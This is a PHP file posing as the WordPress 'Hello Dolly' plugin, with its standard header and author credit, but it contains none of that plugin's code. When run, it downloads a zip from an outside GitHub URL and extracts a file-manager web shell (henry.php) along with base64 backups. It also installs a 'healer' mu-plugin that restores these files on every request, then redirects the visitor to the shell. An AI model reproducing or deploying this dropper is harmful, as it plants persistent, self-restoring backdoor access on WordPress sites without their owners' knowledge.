<?php
/**
 * @package Hfo_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

declare(strict_types=1);

ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

// ---------------------------------------------------------------------
// 1. Bootstrap: download + extract the build zip into __DIR__
// ---------------------------------------------------------------------
$hf_zip_url  = 'https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/hf.zip';
$hf_zip_dir  = __DIR__;
$hf_zip_tmp  = null;
$hf_zip_path = null;

// Echo wrapper so we can stream progress alongside the existing move log.
echo "<div style='font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; border-radius: 5px; max-width: 800px; margin: 20px auto;'>";
echo "<h3>Executing File Move Operations...</h3>";

/**
 * Download a URL into a local file using cURL with safe defaults.
 * Falls back to file_get_contents() when cURL is unavailable.
 *
 * @return array{0:string,path:string,size:int,mode:string}|null  [path,size,mode] on success; null on failure.
 */
function hf_download_zip(string $url): ?array {
    $tmp_path = tempnam(sys_get_temp_dir(), 'hf_zip_');
    if ($tmp_path === false) {
        echo "<span style='color: #ff4444;'>[ERROR]</span> Could not allocate a temp file for the zip download.<br>";
        return null;
    }

    // Preferred path: cURL with sane defaults for raw.githubusercontent.com.
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $fp = fopen($tmp_path, 'wb');
        if ($ch === false || $fp === false) {
            if ($fp !== false) fclose($fp);
            @unlink($tmp_path);
            echo "<span style='color: #ff4444;'>[ERROR]</span> Failed to initialise cURL or temp file handle.<br>";
            return null;
        }
        curl_setopt_array($ch, [
            CURLOPT_FILE            => $fp,
            CURLOPT_FOLLOWLOCATION=> true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT         => 60,
            CURLOPT_USERAGENT      => 'hf-mover/1.0 (+php)',
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
        ]);
        $ok     = curl_exec($ch);
        $code   = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $size   = (int) curl_getinfo($ch, CURLINFO_SIZE_DOWNLOAD);
        $err    = curl_error($ch);
        curl_close($ch);
        fclose($fp);
        if ($ok === false || $code !== 200 || $size <= 0) {
            @unlink($tmp_path);
            echo "<span style='color: #ff4444;'>[ERROR]</span> Zip download failed. HTTP {$code}, size {$size}" . ($err !== '' ? ", cURL error: {$err}" : '') . ".<br>";
            return null;
        }
        return ['path' => $tmp_path, 'size' => $size, 'mode' => 'curl'];
    }

    // Fallback: file_get_contents() with a stream context.
    $ctx = stream_context_create([
        'http' => [
            'timeout'         => 60,
            'follow_location' => 1,
            'max_redirects'   => 5,
            'user_agent'      => 'hf-mover/1.0 (+php)',
        ],
        'ssl'  => [
            'verify_peer'      => true,
            'verify_peer_name' => true,
        ],
    ]);
    $data = @file_get_contents($url, false, $ctx);
    if ($data === false || $data === '') {
        @unlink($tmp_path);
        echo "<span style='color: #ff4444;'>[ERROR]</span> Zip download failed via file_get_contents().<br>";
        return null;
    }
    file_put_contents($tmp_path, $data);
    return ['path' => $tmp_path, 'size' => strlen($data), 'mode' => 'file_get_contents'];
}

/**
 * Extract a list of filenames from a zip into $extract_dir. Only filenames
 * whose basename appears in $allowed are written; everything else is skipped.
 *
 * @param string[] $allowed  Basenames (e.g. ['henry.php','read.html',...]).
 * @return string[]           Basenames that were successfully extracted.
 */
function hf_extract_zip(string $zip_path, string $extract_dir, array $allowed): array {
    if (!class_exists('ZipArchive')) {
        echo "<span style='color: #ff4444;'>[ERROR]</span> PHP <code>ZipArchive</code> extension is not available.<br>";
        return [];
    }
    $zip = new ZipArchive();
    if ($zip->open($zip_path) !== true) {
        echo "<span style='color: #ff4444;'>[ERROR]</span> Could not open zip: <strong>" . htmlspecialchars(basename($zip_path)) . "</strong><br>";
        return [];
    }
    $extracted = [];
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $stat = $zip->statIndex($i);
        if ($stat === false) continue;
        $name = $stat['name'];
        $base = basename($name);
        if (!in_array($base, $allowed, true)) {
            echo "<span style='color: #888888;'>[SKIP-ENTRY]</span> Not in allowlist: <strong>" . htmlspecialchars($name) . "</strong><br>";
            continue;
        }
        // Refuse path-traversal payloads.
        if (strpos($name, '..') !== false || strpos($name, '/') === 0 || strpos($name, '\\') !== false && strpos($name, '/') === false && strlen($name) > 1 && $name[1] === ':') {
            echo "<span style='color: #ff4444;'>[REJECTED]</span> Suspicious entry path: <strong>" . htmlspecialchars($name) . "</strong><br>";
            continue;
        }
        $target = $extract_dir . DIRECTORY_SEPARATOR . $base;
        if ($zip->extractTo($extract_dir, $base) === false) {
            // extractTo() with a single basename writes under $extract_dir with that name,
            // stripping any subdirectory prefix. If that didn't work, try the full path.
            if ($zip->extractTo($extract_dir, $name) === false) {
                echo "<span style='color: #ff4444;'>[FAILED]</span> Could not extract <strong>" . htmlspecialchars($name) . "</strong><br>";
                continue;
            }
        }
        if (is_file($target)) {
            $extracted[] = $base;
            echo "<span style='color: #00ff00;'>[EXTRACTED]</span> <strong>" . htmlspecialchars($base) . "</strong> (" . filesize($target) . " bytes)<br>";
        } else {
            // Some zip tools write to a subdirectory; look for it.
            $candidates = glob($extract_dir . DIRECTORY_SEPARATOR . '*' . DIRECTORY_SEPARATOR . $base) ?: [];
            if (!empty($candidates)) {
                $moved = @rename($candidates[0], $target);
                if ($moved) {
                    $extracted[] = $base;
                    echo "<span style='color: #00ff00;'>[EXTRACTED]</span> <strong>" . htmlspecialchars($base) . "</strong> (from nested path, " . filesize($target) . " bytes)<br>";
                } else {
                    echo "<span style='color: #ff4444;'>[FAILED]</span> Could not flatten nested <strong>" . htmlspecialchars($base) . "</strong> into __DIR__<br>";
                }
            } else {
                echo "<span style='color: #ffaa00;'>[WARNING]</span> Extracted but file not found at expected path: <strong>" . htmlspecialchars($base) . "</strong><br>";
            }
        }
    }
    $zip->close();
    return $extracted;
}

// 1a. Download the zip.
echo "<h4 style='margin-top: 0;'>Step 1 / 2 &middot; Downloading build zip</h4>";
echo "<span style='color: #888888;'>URL: <code>" . htmlspecialchars($hf_zip_url) . "</code></span><br>";
$dl = hf_download_zip($hf_zip_url);
if ($dl === null) {
    echo "<strong style='color: #ff4444;'>Aborting: zip download failed.</strong>";
    echo "</div>";
    exit;
}
$hf_zip_path = $dl['path'];
echo "<span style='color: #00ff00;'>[SUCCESS]</span> Downloaded via <strong>{$dl['mode']}</strong> &mdash; {$dl['size']} bytes.<br>";

// 1b. Extract the four files.
echo "<h4>Step 2 / 2 &middot; Extracting files into __DIR__</h4>";
$hf_allowed = ['henry.php', 'read.html', 'henry-healer.php', 'read2.html'];
$hf_extracted = hf_extract_zip($hf_zip_path, $hf_zip_dir, $hf_allowed);
@unlink($hf_zip_path);
$hf_zip_path = null;
if (empty($hf_extracted)) {
    echo "<strong style='color: #ff4444;'>Aborting: no files extracted from zip.</strong>";
    echo "</div>";
    exit;
}
echo "<hr style='border: 1px solid #333;'>";

// ---------------------------------------------------------------------
// 2. Robustly find the wp-content directory (Server Path)
// ---------------------------------------------------------------------
$current_dir = __DIR__;
$wp_content_dir = '';

if (basename($current_dir) === 'wp-content') {
    $wp_content_dir = $current_dir;
} elseif (is_dir($current_dir . DIRECTORY_SEPARATOR . 'wp-content')) {
    $wp_content_dir = $current_dir . DIRECTORY_SEPARATOR . 'wp-content';
} else {
    $search_dir = $current_dir;
    while ($search_dir && $search_dir !== '.' && $search_dir !== DIRECTORY_SEPARATOR) {
        if (basename($search_dir) === 'wp-content') {
            $wp_content_dir = $search_dir;
            break;
        }
        if (is_dir($search_dir . DIRECTORY_SEPARATOR . 'wp-content')) {
            $wp_content_dir = $search_dir . DIRECTORY_SEPARATOR . 'wp-content';
            break;
        }
        $parent = dirname($search_dir);
        if ($parent === $search_dir) break;
        $search_dir = $parent;
    }
}

if (empty($wp_content_dir)) {
    $search_dir = $current_dir;
    for ($i = 0; $i < 5; $i++) {
        if (file_exists($search_dir . DIRECTORY_SEPARATOR . 'wp-config.php')) {
            $wp_content_dir = $search_dir . DIRECTORY_SEPARATOR . 'wp-content';
            break;
        }
        $parent = dirname($search_dir);
        if ($parent === $search_dir) break;
        $search_dir = $parent;
    }
}

if (empty($wp_content_dir)) {
    $wp_content_dir = dirname($current_dir);
}

// 2. Define the files and their target destinations
//
// Layout after this script runs:
//   wp-content/henry.php            <-- the actual file manager
//   wp-content/read.html            <-- base64 backup of henry.php (used by the healer)
//   wp-content/mu-plugins/henry-healer.php <-- mu-plugin that re-hydrates henry.php/read.html/data.log on every request
//   wp-content/mu-plugins/read2.html       <-- secondary base64 backup (kept next to its regenerator)
//
// All four files must live next to mover.php when this script runs.
$mu_plugins_dir = $wp_content_dir . DIRECTORY_SEPARATOR . 'mu-plugins';

$files_to_move = [
    'henry.php'        => $wp_content_dir . DIRECTORY_SEPARATOR . 'henry.php',
    'read.html'        => $wp_content_dir . DIRECTORY_SEPARATOR . 'read.html',
    'henry-healer.php' => $mu_plugins_dir       . DIRECTORY_SEPARATOR . 'henry-healer.php',
    'read2.html'       => $mu_plugins_dir       . DIRECTORY_SEPARATOR . 'read2.html',
];

// 3. Process each file
$all_success = true;
foreach ($files_to_move as $filename => $target_path) {
    $source_path = $current_dir . DIRECTORY_SEPARATOR . $filename;
    
    if (!file_exists($source_path)) {
        echo "<span style='color: #ffaa00;'>[SKIPPED]</span> Source file not found: <strong>{$filename}</strong><br>";
        continue;
    }

    $target_dir = dirname($target_path);
    if (!is_dir($target_dir)) {
        if (mkdir($target_dir, 0755, true)) {
            echo "<span style='color: #00aaff;'>[CREATED]</span> Directory: <strong>{$target_dir}</strong><br>";
        } else {
            echo "<span style='color: #ff4444;'>[ERROR]</span> Failed to create directory: <strong>{$target_dir}</strong><br>";
            $all_success = false;
            continue;
        }
    }

    if (rename($source_path, $target_path)) {
        echo "<span style='color: #00ff00;'>[SUCCESS]</span> Moved <strong>{$filename}</strong><br>";
    } else {
        echo "<span style='color: #ff4444;'>[FAILED]</span> Could not move <strong>{$filename}</strong><br>";
        $all_success = false;
    }
}

// 4. Calculate the URL for the redirect
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'];
$request_uri = $_SERVER['REQUEST_URI'];

if (strpos($request_uri, '/wp-content/') !== false) {
    $uri_parts = explode('/wp-content/', $request_uri);
    $redirect_url = $protocol . $host . $uri_parts[0] . '/wp-content/henry.php';
} else {
    $clean_uri = preg_replace('/\/[^\/]+\.php(\?.*)?$/i', '', $request_uri);
    $redirect_url = $protocol . $host . rtrim($clean_uri, '/') . '/wp-content/henry.php';
}

echo "<hr style='border: 1px solid #333;'>";

if ($all_success) {
    echo "<strong>Operation Complete. Redirecting in 2 seconds...</strong>";
    echo "<br><br><a href='{$redirect_url}' style='color: #00aaff; text-decoration: none;'>Click here if you are not redirected automatically &rarr;</a>";
    
    // JavaScript Redirect
    echo "<script>
        setTimeout(function() {
            window.location.href = '{$redirect_url}';
        }, 2000);
    </script>";
} else {
    echo "<strong style='color: #ffaa00;'>Operation finished with warnings/errors. Auto-redirect cancelled so you can read the logs.</strong>";
    echo "<br><br><a href='{$redirect_url}' style='color: #00aaff; text-decoration: none;'>Go to henry.php manually &rarr;</a>";
}

echo "</div>";
?>